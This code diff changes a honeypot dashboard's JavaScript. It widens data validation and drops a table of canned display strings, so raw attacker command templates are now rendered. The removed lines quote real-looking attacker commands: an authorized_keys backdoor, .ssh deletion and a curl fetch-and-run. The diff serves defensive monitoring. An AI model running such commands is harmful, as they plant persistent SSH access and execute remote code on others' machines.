@@ -14,7 +14,7 @@
     return node;
   }
   function validate(data) {
-    return data && data.version === 1 && data.window_hours === 24 &&
+    return data && [1,2].includes(data.version) && data.window_hours === 24 &&
       typeof data.published_at === "string" && Number.isFinite(Date.parse(data.published_at)) &&
       data.totals && ["sessions","unique_sources","auth_events","command_events","file_events"].every(k => isCount(data.totals[k])) &&
       Array.isArray(data.hourly) && data.hourly.length === 24 && data.hourly.every(h =>
@@ -50,15 +50,7 @@
     for(const name of ["Sessions","Authentication events"]){const s=document.createElement("span");s.textContent=name;legend.append(s);}
     host.append(legend);
   }
-  // Verified Cowrie command sequences. Fixed display text only: never render raw attacker inputs.
-  // The live counts come from the exporter’s 24-hour technique matches; they are not exact-string counts.
-  const observedCommandExamples = Object.freeze({
-    "SSH authorized_keys modification attempt": 'cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa [REDACTED_KEY] mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~',
-    "SSH key file removal attempt": 'cd ~ && rm -rf .ssh && mkdir .ssh',
-    "Remote file retrieval command": 'bash <(curl -sL [REDACTED_URL] -e [REDACTED_URL] --auto-discovery [REDACTED_TOKEN])',
-    "Scheduled persistence reference": 'crontab -l'
-  });
-  function renderRows(id, data, mode) {
+  function renderRows(id, data, mode, dataVersion=1) {
     const tbody=byId(id);tbody.replaceChildren();
     if (!data.length){
       const tr=document.createElement("tr"),td=document.createElement("td");
@@ -73,8 +65,8 @@
         if(!validHash || !isCount(item.count))continue;
         const code=document.createElement("code");code.textContent=item.sha256;first.append(code);
       } else {
-        if(typeof item.template!=="string" || item.template.length>96 || !isCount(item.count))continue;
-        const code=document.createElement("code");code.textContent=observedCommandExamples[item.template] || item.template;first.append(code);
+        if(typeof item.template!=="string" || item.template.length>(dataVersion===2?350:96) || !isCount(item.count))continue;
+        const code=document.createElement("code");code.textContent=item.template;first.append(code);
       }
       const count=document.createElement("td");count.textContent=fmt(item.count);
       tr.append(first,count);
@@ -113,7 +105,7 @@
       if(age>20*60*1000){note.hidden=false;note.textContent="Latest data may be stale; the publisher has not updated recently.";}
       else note.hidden=true;
       drawChart(data.hourly);
-      renderRows("obs-command-rows",data.commands,"commands");
+      renderRows("obs-command-rows",data.commands,"commands",data.version);
       renderRows("obs-artifact-rows",data.artifacts,"artifacts");
     } catch(error){showError("Unable to load the observatory snapshot. Previously displayed data may be stale.");}
   }
